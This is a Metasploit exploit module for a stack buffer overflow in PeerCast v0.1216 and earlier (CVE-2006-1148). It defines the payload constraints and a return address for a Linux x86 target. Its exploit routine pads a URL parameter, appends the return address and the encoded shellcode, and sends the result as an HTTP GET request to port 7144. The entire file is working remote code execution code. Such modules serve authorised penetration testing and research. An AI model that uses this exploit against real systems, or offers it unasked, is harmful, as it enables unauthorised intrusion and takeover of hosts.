##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PeerCast URL Handling Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack buffer overflow in PeerCast <= v0.1216.
        The vulnerability is caused due to a boundary error within the
        handling of URL parameters.
      },
      'Author'         => [ 'MC' ],
      'License'        => BSD_LICENSE,
      'References'     =>
        [
          ['CVE', '2006-1148'],
          ['OSVDB', '23777'],
          ['BID', '17040']
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 200,
          'BadChars' => "\x00\x0a\x0d\x20\x0d\x2f\x3d\x3b",
          'MinNops'  => 64,
        },
      'Platform'       => 'linux',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['PeerCast v0.1212 Binary', { 'Ret' => 0x080922f7 }],
        ],
      'DisclosureDate' => '2006-03-08'))

    register_options([
      Opt::RPORT(7144)
    ])
  end

  def exploit
    connect

    pat = rand_text_alphanumeric(780)
    pat << [target.ret].pack('V')
    pat << payload.encoded

    uri = '/stream/?' + pat

    res = "GET #{uri} HTTP/1.0\r\n\r\n"

    print_status("Trying target address 0x%.8x..." % target.ret)
    sock.put(res)

    handler
    disconnect
  end
end
